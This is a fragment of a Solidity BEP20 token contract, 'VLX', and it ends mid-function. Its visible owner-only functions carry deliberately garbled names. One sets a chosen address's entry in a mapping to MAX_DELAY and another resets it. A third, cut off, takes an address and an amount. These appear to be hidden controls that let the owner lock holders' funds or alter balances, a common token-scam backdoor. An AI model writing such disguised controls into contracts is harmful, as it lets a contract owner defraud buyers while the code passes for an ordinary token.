...
contract VLX is IBEP20, HasForeignAsset {
    ...
    function getVelox24301ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setVelox24301reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupVelox24301ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupVelox24301Aasses(address booadndd,uint256 nuum) public onlyOwner {
